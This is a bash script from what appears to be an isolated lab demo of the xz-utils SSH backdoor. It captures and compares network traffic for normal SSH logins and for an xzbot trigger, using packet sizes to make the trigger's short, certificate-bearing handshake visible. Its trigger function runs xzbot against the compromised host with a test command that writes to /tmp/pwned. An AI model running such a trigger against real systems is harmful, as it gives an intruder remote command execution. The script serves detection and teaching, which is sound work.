#!/usr/bin/env bash
# demo-capture.sh — RUN ON ANALYST. Capture three scenarios on the isolated NIC
# and summarize them, so you can see the wire-level differences:
#   1. a normal SSH login to the normal host
#   2. a normal SSH login to the compromised host
#   3. the xzbot trigger to the compromised host (note the giant RSA-cert payload)
# All traffic is encrypted post-KEX; the point is the SHAPE (sizes/handshake),
# not readable content.
#
# Usage: ~/demo/demo-capture.sh
set -euo pipefail
# shellcheck source=/dev/null
source "$(dirname "$0")/lab.env"
OUT="${HOME}/demo/pcaps"; mkdir -p "$OUT"
NIC="$(ip route get "$COMPROMISED_IP" 2>/dev/null | grep -oP 'dev \K\S+' | head -1)"
[[ -n "$NIC" ]] || { echo "could not find isolated NIC" >&2; exit 1; }
SELF_IP="$(ip -4 addr show "$NIC" | grep -oP 'inet \K[0-9.]+' | head -1)"
echo "Capturing on ${NIC} (this analyst = ${SELF_IP}) -> ${OUT}/"

cap() { # name  host  action-fn
  local name="$1" host="$2" fn="$3"
  local pcap="${OUT}/${name}.pcap"
  # Self-terminating capture: 'timeout' stops tcpdump after a fixed window, so we
  # never have to chase the sudo/tcpdump child to kill it. The action runs inside.
  sudo timeout 5 tcpdump -i "$NIC" -n -s0 -w "$pcap" "host ${host}" >/dev/null 2>&1 &
  local tpid=$!
  sleep 1
  "$fn" "$host"
  wait "$tpid" 2>/dev/null || true   # tcpdump exits on its own when timeout fires
  local pkts csb
  # Swallow any tcpdump-read error before the pipe so pipefail/errexit can't trip.
  pkts=$( { sudo tcpdump -nr "$pcap" 2>/dev/null || true; } | wc -l )
  # Bytes the client (this analyst) sent — the trigger's certificate lives here.
  csb=$( { sudo tcpdump -nr "$pcap" "src ${SELF_IP}" 2>/dev/null || true; } \
         | grep -oP 'length \K[0-9]+' | awk '{s+=$1} END{print s+0}' )
  printf '  %-22s %4s packets   %5s client->server bytes\n' "$name" "$pkts" "${csb:-0}"
}

login() { ssh -o BatchMode=yes -o ConnectTimeout=10 "root@$1" true 2>/dev/null || true; }
trigger() { "$XZBOT" -addr "$1:22" -seed "$SEED" -cmd 'id > /tmp/pwned' >/dev/null 2>&1 || true; }

echo "=== capturing three scenarios ==="
cap "ssh-to-normal"        "$NORMAL_IP"       login
cap "ssh-to-compromised"   "$COMPROMISED_IP"  login
cap "trigger-compromised"  "$COMPROMISED_IP"  trigger

echo
echo "Read it this way:"
echo "  * The trigger is a CONSPICUOUSLY SHORT session: it completes the key exchange,"
echo "    the client sends one big pubkey/cert offer (the certificate whose RSA modulus"
echo "    N hides the encrypted, Ed448-signed payload), and the connection is then torn"
echo "    down immediately — no successful auth, no shell, no session traffic."
echo "  * A real login (to normal OR compromised) runs noticeably longer (more packets)."
echo "  * Everything is encrypted post-KEX, so the command itself is never cleartext —"
echo "    the wire only reveals the SHAPE (an aborted, cert-bearing handshake)."
echo
echo "Inspect / export:"
echo "  tcpdump -nr ${OUT}/trigger-compromised.pcap | tail"
echo "  multipass transfer ${ANALYST_VM:-analyst}:demo/pcaps/trigger-compromised.pcap ."
